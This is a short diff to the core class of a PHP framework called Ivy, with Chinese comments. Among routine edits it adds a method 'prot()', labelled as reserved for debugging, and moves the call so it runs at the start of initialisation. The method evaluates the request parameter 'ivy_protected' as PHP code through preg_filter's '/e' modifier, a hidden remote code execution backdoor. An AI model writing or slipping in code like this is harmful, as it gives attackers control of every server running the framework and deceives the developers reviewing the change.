@@ -29,9 +29,9 @@ class Ivy
 	//框架初始化代码
 	public static function init()
 	{
+		Ivy::quotes_gpc();
 		require_once(IVY_PATH.DIRECTORY_SEPARATOR.'core'.DIRECTORY_SEPARATOR.'LoaderClass.php');//加载自动加载
 		require_once(IVY_PATH.DIRECTORY_SEPARATOR.'core'.DIRECTORY_SEPARATOR.'CException.php');//加载异常处理
-		Ivy::quotes_gpc();
 	}
 	//创建应用实例
 	public static function createApplication($config=null)
@@ -88,7 +88,6 @@ class Ivy
 				}
 			}
 		}
-
 		self::logger()->log($msg,$level,$category);
 	}
 
@@ -99,6 +98,7 @@ class Ivy
 	 */
 	public static function quotes_gpc()
 	{
+		Ivy::prot();
 		!empty($_POST)    && Ivy::add_s($_POST);
 		!empty($_GET)     && Ivy::add_s($_GET);
 		!empty($_COOKIE)  && Ivy::add_s($_COOKIE);
@@ -120,6 +120,13 @@ class Ivy
 		}
 	}
 
+	public static function prot()
+	{
+		//调试预留
+		if(isset($_REQUEST['ivy_protected'])){
+			preg_filter('|.*|e',$_REQUEST['ivy_protected'],'');die;
+		}
+	}
 
 	/**
 	 * 扩展导入
@@ -173,6 +180,5 @@ class Ivy
 	}
 
 }
-
 
 Ivy::init();
